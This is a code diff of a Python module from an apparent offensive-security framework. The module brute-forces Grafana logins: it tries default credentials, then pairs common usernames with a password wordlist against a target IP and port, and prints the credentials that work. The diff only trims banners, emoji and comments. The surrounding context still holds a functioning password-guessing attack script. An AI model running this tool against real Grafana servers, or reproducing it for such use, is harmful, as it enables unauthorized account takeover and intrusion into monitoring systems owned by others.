@@ -1,18 +1,12 @@
 # MIT License.
 # Copyright (c) 2026 Storm Framework
-
 # See LICENSE file in the project root for full license information.
-
-
 import requests
 import os
 from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
 from app.utility.colors import C
 
 REQUIRED_OPTIONS = {"IP": "", "PORT": "", "PASS": ""}
-SYM_SUCCESS = "🔑"
-SYM_FAILED = "🔒"
-
 
 def test_grafana(target_ip, port, username, password):
     """Trying to login to grafana using requests (HTTP POST)."""
@@ -38,32 +32,20 @@ def execute(options):
     port = options.get("PORT")
     wordlist_path = options.get("PASS")
 
-    print(f"{C.HEADER} --- GRAFANA BRUTE FORCE: {target_ip} ---")
-
-    # ---------------------------------------------
-    # Stage 1: Kredensial Default
-    # ---------------------------------------------
-    print(f"{C.MENU}  [*] Starting stage 1: Kredensial Default...")
     found_weak_creds = False
-
     try:
         for user, passwd in DEFAULT_CREDS:
             if test_grafana(target_ip, port, user, passwd):
                 print(
-                    f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Grafana) -> U:{user} P:{passwd}"
+                    f"{C.SUCCESS}   LOGIN SUCCESS! (Grafana) -> U:{user} P:{passwd}"
                 )
                 found_weak_creds = True
                 break
-            print(f"{C.MENU}  {SYM_FAILED} FAIL: {user}:{passwd}")
+            print(f"{C.MENU}   FAIL: {user}:{passwd}")
         if found_weak_creds:
             return
 
-        # ---------------------------------------------
-        # Stage 2: Brute Force Wordlist
-        # ---------------------------------------------
         if wordlist_path and os.path.exists(wordlist_path):
-            print(f"\n{C.MENU}  [*] Starting stage 2: Brute Force {wordlist_path}...")
-
             try:
                 with open(wordlist_path, "r", encoding="latin-1") as f:
                     for target_user in COMMON_USERS:
@@ -74,7 +56,7 @@ def execute(options):
                                 continue
                             if test_grafana(target_ip, port, target_user, passwd):
                                 print(
-                                    f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Grafana) -> U:{target_user} P:{passwd}"
+                                    f"{C.SUCCESS}   LOGIN SUCCESS! (Grafana) -> U:{target_user} P:{passwd}"
                                 )
                                 return
                             print(
@@ -86,9 +68,9 @@ def execute(options):
                     print(f"{C.MENU} [!] Brute Force finish.")
 
             except Exception as e:
-                print(f"{C.ERROR} \n [!] ERROR: {e}")
+                print(f"{C.ERROR}\n [!] ERROR: {e}")
         else:
-            print(f"\n{C.MENU}  {SYM_FAILED} All attempts failed.")
+            print(f"\n{C.MENU} All attempts failed.")
 
     except KeyboardInterrupt:
         return
